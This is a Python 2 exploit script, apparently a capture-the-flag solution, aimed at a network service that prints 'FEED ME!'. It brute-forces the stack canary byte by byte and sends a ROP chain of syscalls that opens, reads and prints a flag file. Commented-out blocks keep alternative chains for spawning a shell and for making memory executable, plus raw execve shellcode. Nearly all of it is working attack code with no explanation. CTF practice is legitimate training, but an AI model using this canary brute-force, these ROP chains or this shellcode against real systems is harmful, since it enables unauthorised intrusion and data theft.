#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *
import random
import time
import binascii
import time
def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
recvuntil("FEED ME!\n")
canary = "\x00"
while len(canary)!=4:
	for brute in range(0,255):
		#print brute
		init = binascii.unhexlify(hex(32+len(canary)+1)[2:])
		garbage = "A"*32
		
		if len(hex(brute)[2:])==1:
			pad = "0"
		else:
			pad = ""
		tryLeakByteCanary = binascii.unhexlify(pad + hex(brute)[2:])
		s.send(init + garbage + canary+ tryLeakByteCanary)
		data = recvuntil("FEED ME!\n")
		if "YUM" in data:
			print "LEAKED: "  + str(tryLeakByteCanary)
			print data
			canary += tryLeakByteCanary
			break
print "CHECK len(canary): " + str(len(canary))
print "canary: " + canary
print "PWN THEM!!"

p = ''
#read flag string
p += p32(0x080bb496) #pop eax
p += p32(0x3)#read sys
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x5)#len(flag\x00)
p += p32(0x080eaf80)#BSS address
p+= p32(0x0)
p += p32(0x0806FA20) #int 80; ret


p += p32(0x080bb496) #pop eax
p += p32(0x5) #fopen
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x0)
p += p32(0x0)
p+= p32(0x080eaf80) #address of flag string
p += p32(0x0806FA20) #int 80; ret

p += p32(0x080bb496) #pop eax
p += p32(0x3) #read sys
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x100) #length
p += p32(0x080ea060) #.data address
p+= p32(0x2) #FD
p += p32(0x0806FA20) #int 80; ret

p += p32(0x080bb496) #pop eax
p += p32(0x4) #write sys
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x100) #length
p += p32(0x080ea060)#address
p+= p32(0x01) #FD
p += p32(0x0806FA20) #int 80; ret


init = binascii.unhexlify(hex(len(garbage + canary + "A"*12 + p))[2:])
s.send(init + garbage + canary + "A"*12  + p)
print recvuntil("...\n")
print "interactive "
s.send("flag\x00")
interactive()
s.close()




#################################################################################################
################################### Our try to spawn shell :)####################################
#################### this ones works locally but not on their server due busybox ################
#################################################################################################



# #ROP
# p = ''
# p += pack('<I', 0x0806f34a) # pop edx ; ret
# p += pack('<I', 0x080ea060) # @ .data
# p += pack('<I', 0x080bb496) # pop eax ; ret
# p += '/bin'
# p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
# p += pack('<I', 0x0806f34a) # pop edx ; ret
# p += pack('<I', 0x080ea064) # @ .data + 4
# p += pack('<I', 0x080bb496) # pop eax ; ret
# p += '//ls'
# p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
# p += pack('<I', 0x0806f34a) # pop edx ; ret
# p += pack('<I', 0x080ea068) # @ .data + 8
# p += pack('<I', 0x08054a10) # xor eax, eax ; ret
# p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
# p += pack('<I', 0x080481c9) # pop ebx ; ret
# p += pack('<I', 0x080ea060) # @ .data
# p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
# p += pack('<I', 0x080ea068) # @ .data + 8
# p += pack('<I', 0x080ea060) # padding without overwrite ebx
# p += pack('<I', 0x0806f34a) # pop edx ; ret
# p += pack('<I', 0x080ea068) # @ .data + 8
# p += pack('<I', 0x08054a10) # xor eax, eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x080497fe) # inc eax ; ret
# p += pack('<I', 0x08049761) # int 0x80

# init = binascii.unhexlify(hex(len(garbage + canary + "A"*12 + p))[2:])
# s.send(init + garbage + canary + "A"*12  + p)

#SHELLCODE
# p = ''
# p += p32(0x080bb496) #pop eax
# p += p32(0x7d) #125 mprotect
# p += p32(0x0806f370)  #pop edx pop ecx pop ebx
# p += p32(0x7) #RWX
# p += p32(0x4000) #size
# p += p32(0x80e8000) #.bss
# p += p32(0x0806FA20) #int 80
# p += p32(0x080bb496) #pop eax
# p += p32(0x3) #read sys
# p += p32(0x0806f370)  #pop edx pop ecx pop ebx
# p += p32(0x1d) #len(shellcode)
# p += p32(0x080eaf80) #address
# p+= p32(0x0)
# p += p32(0x0806FA20) #int 80
# p += p32(0x080eaf80) #call the shellcode

# init = binascii.unhexlify(hex(len(garbage + canary + "A"*12 + p))[2:])
# s.send(init + garbage + canary + "A"*12  + p)
#print recvuntil("...\n")
#s.send("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80") #SHELLCODE
